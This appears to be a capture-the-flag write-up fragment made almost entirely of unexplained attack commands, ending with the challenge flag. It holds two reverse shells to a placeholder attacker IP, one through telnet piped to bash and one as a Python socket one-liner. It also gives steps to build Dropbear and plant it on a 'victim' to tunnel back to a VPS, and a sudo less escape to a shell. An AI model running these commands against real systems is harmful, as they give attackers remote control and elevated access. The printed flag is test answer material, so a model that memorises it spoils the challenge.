## EOP

```sh
find . -writable

telnet YOUR-IP-ADDRESS 8888 | /bin/bash | telnet YOUR-IP-ADDRESS 8889

python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR-IP-ADDRESS",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

python3 -c 'import pty;pty.spawn("/bin/sh")'

# Dropbear
git clone https://github.com/mrschyte/pentestkoala
cd pentestkoala
./configure LDFLAGS="-static"
make

# Download it to victim machine

## vps
ncat -lvp 5000 --sh-exec 'ncat -lvp 9999'

## victim
./dropbear -p YOUR-IP-ADDRESS:5000

## vps
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null localhost -D9050 -p9999

sudo -u dev /usr/bin/less /etc/passwd
!/bin/sh
```

## Flag
DGA{058cff4353f7c743f4ddaab9b6c7856f}
